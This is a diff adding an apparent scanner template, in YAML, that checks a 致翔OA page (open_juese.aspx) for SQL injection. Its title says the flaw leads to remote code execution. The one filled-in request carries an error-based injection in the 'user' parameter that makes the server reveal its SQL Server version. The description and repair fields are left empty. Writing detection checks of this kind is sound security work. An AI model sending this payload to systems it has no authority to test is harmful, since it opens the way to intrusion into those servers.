@@ -1,0 +1,23 @@
+id:
+
+info:
+  name: 致翔OA open_juese.aspx SQL注入致RCE
+  severity:
+  description:
+  details:
+  repair:
+requests1:
+  method: POST
+  path: /OpenWindows/open_juese.aspx?key=1&name=1&user=-1)+and+1=@@VERSION--+&requeststr=
+  headers:
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
+    Accept: '*/*'
+    Accept-Encoding: gzip, deflate
+    Accept-Language: zh-CN,zh;q=0.9
+    Connection: close
+response1:
+  headers:
+  body: SQL Server
+  code: 200
+requests2:
+response2:
